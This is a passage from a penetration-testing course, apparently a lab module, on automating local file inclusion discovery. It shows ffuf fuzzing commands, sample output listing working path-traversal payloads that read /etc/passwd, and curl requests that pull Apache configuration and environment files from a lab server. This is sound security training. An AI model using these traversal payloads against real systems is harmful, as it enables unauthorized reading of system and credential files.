It is essential to understand how file inclusion attacks work and how we can manually craft advanced payloads and use custom techniques to achieve remote code execution. This is because, in many cases, exploiting the vulnerability may require a custom payload that matches its specific configurations. Additionally, when dealing with security measures like a WAF (web application firewall) or a firewall, we must apply our knowledge to identify how a specific payload/character is being blocked and attempt to craft a custom payload to bypass it.

We may not need to manually exploit the LFI vulnerability in many trivial cases. There are many automated methods that can help us quickly identify and exploit trivial LFI vulnerabilities. We can use fuzzing tools to test a large list of common LFI payloads and see if any of them work, or we can use specialized LFI tools to search for such vulnerabilities. This is what we will discuss in this section.

---

## Parameter Fuzzing

HTML forms that users interact with on the web application's front-end tend to be properly tested and well secured against various web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML form, so normal users would never access them or unintentionally cause harm through them. This is why it can be important to fuzz for exposed parameters, as they tend to be less secure than public ones.

The module [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/app/module/54) details how we can fuzz for `GET`/`POST` parameters. For example, we can fuzz the page to find common `GET` parameters as follows:

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Once we identify an exposed parameter that isn't tied to any of the forms we tested, we can perform all the LFI tests discussed in this module. This isn't exclusive to LFI vulnerabilities but also applies to most web vulnerabilities covered in other modules, as exposed parameters may also be vulnerable to any other type of vulnerability.

**Tip:** For more precise scanning, we can limit our analysis to the most common LFI parameters listed at this [link](https://book.hacktricks.xyz/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

---

## LFI Wordlists

So far in this module, we've been manually crafting our LFI payloads to test for this type of vulnerability. This is because manual testing is more reliable and can uncover LFI vulnerabilities that might otherwise go undetected, as previously discussed. However, in many cases, we may want to run a quick test on a parameter to check if it's vulnerable to common LFI payloads, which can save time when testing multiple vulnerabilities in web applications.

There are several [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scanning. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it includes various bypasses and common files, making it easier to run multiple tests at once. We can use this wordlist to fuzz the `?language=` parameter we've been testing throughout the module, like this:

```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

Note title: Untitled

As we can see, the scan returned several LFI payloads that can be used to exploit the vulnerability. Once we have identified the payloads, we must test them manually to verify that they work as expected and display the contents of the included file.

---

## Server File Fuzzing

In addition to LFI payload fuzzing, there are different server files that can be useful in our LFI exploitation, so it would be helpful to know where these files exist and if we can read them. Such files include: the `server webroot path`, the `server configuration file`, and the `server logs`.

#### Server Webroot

We may need to know the full path of the server webroot to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded but cannot access its `/uploads` directory through relative paths (e.g., `../../uploads`). In such cases, we may need to determine the server webroot path to locate our uploaded files through absolute paths instead of relative paths.

To do this, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [Linux wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [Windows wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add some directories backward (e.g., `../../../../`), and then append our `index.php`.

The following is an example of how we can do all this with ffuf:
```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

As we can see, the scan correctly identified the webroot path at (`/var/www/html/`). We can also use the same wordlist [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) we used earlier, since it also contains various payloads that could reveal the webroot. If this doesn't help us identify the webroot, our best option would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see below.

#### Server Logs/Configurations

As we saw in the previous section, we need to be able to identify the correct logs directory to perform the log poisoning attacks we discussed. Additionally, as we just mentioned, we may also need to read the server configurations to identify the webroot path and other important information (like the logs path!).

To do this, we can also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, since it contains many of the logs paths and server configurations we might be interested in. If we wanted a more precise scan, we could use this [Linux wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [Windows wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they aren't part of `seclists`, so we'd need to download them first. Let's try the Linux wordlist against our LFI vulnerability and see what we get:

```
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

As we can see, the scan returned over 60 results, many of which were not identified with the wordlist [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), which shows us that precise scanning is important in certain cases. Now, we can attempt to read any of these files to see if we can retrieve their contents. We will read (`/etc/apache2/apache2.conf`), as it is a known path for Apache server configuration:

```
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

As we can see, we obtain the default webroot path and the log path. However, in this case, the log path is using an Apache global variable (`APACHE_LOG_DIR`), which is located in another file we previously examined, specifically (`/etc/apache2/envvars`), and we can read it to find the variable's values:

```
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```
As we can see, the variable (`APACHE_LOG_DIR`) is set to (`/var/log/apache2`), and the previous configuration told us that the log files are `/access.log` and `/error.log`, which we accessed in the previous section.

**Note:** Of course, we could simply use a wordlist to find the logs, as several of the ones we used in this section revealed the location of the logs. But this exercise shows us how we can manually review the identified files and then use the information we find to identify more files and important information. This is quite similar to when we read different file sources in the `PHP filters` section, and such efforts can reveal previously unknown information about the web application, which we can use to exploit it further.

---

## Tools for LFI

Finally, we can use a series of LFI tools to automate much of the process we have been learning, which can save time in some cases, but can also overlook many vulnerabilities and files that we might otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are unmaintained and rely on the obsolete `python2`, so using them may not be a long-term solution. Try downloading any of the above tools and test them on any of the exercises we have used in this module to see their level of accuracy.